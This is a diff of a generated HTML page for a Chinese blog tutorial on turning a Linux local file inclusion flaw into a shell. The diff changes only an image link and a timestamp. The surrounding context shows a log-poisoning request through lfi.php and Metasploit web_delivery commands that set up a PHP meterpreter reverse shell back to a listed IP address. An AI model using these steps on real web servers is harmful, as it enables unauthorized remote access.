@@ -18,9 +18,9 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf44873db5aa647e44e30ae">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf44891db5aa647e44e30bc">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf448fb50f8dd54d461c343">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf448b4db5aa647e44e30cd">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf928ba9b521a5a857e5341">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bf448cf50f8dd54d461c322">
-<meta property="og:updated_time" content="2018-11-20T17:54:39.000Z">
+<meta property="og:updated_time" content="2018-11-24T10:33:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="在Linux下文件包含漏洞的另类拿SHELL方法">
 <meta name="twitter:description" content="在实战中还是比较鸡肋的，不过用来维持权限也是很棒的。 攻击者：Kali Linux 目标：Ubuntu 创建一个PHP文件，允许用户通过文件参数包含文件。因此，使用文件参数，我们可以执行一个包含恶意代码的文件,使未经授权的访问是目标PC。  由于我们已经在/ var / www / html中添加了一个包含include函数的php文件，允许通过它读取另一个文件的内容，并且可能导致LFI攻击。让我">
@@ -160,7 +160,7 @@
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf44891db5aa647e44e30bc" alt=""></p>
 <h2 id="本地主机-lfi-php-文件-var-log-auth-log-amp-c-ifconfig"><a href="#本地主机-lfi-php-文件-var-log-auth-log-amp-c-ifconfig" class="headerlink" title=" 本地主机/lfi.php?文件=/var/log/auth.log&amp;c=ifconfig"></a> 本地主机/lfi.php?文件=/var/log/auth.log&amp;c=ifconfig</h2><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448fb50f8dd54d461c343" alt=""><br>如果您在任何Web应用程序中发现此类漏洞，则可以使用metasploit平台来利用Web服务器。</p>
 <figure class="highlight plain"><figcaption><span>exploit/multi/script/web_delivery</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf exploit (web_delivery)&gt;set target 1</span><br><span class="line">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 119.29.205.214</span><br><span class="line">msf exploit (web_delivery)&gt;set srvport  8089</span><br><span class="line">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>
-<p>将上面 复制的恶意代码粘贴到 URL中，如图所示，并将 其 作为命令执行。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448b4db5aa647e44e30cd" alt=""><br>当上面的代码得到执行时，您将获得目标Web服务器的meterpreter会话1。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448cf50f8dd54d461c322" alt=""></p>
+<p>将上面 复制的恶意代码粘贴到 URL中，如图所示，并将 其 作为命令执行。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf928ba9b521a5a857e5341" alt=""><br>当上面的代码得到执行时，您将获得目标Web服务器的meterpreter会话1。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448cf50f8dd54d461c322" alt=""></p>
 
   </div>
 </article>
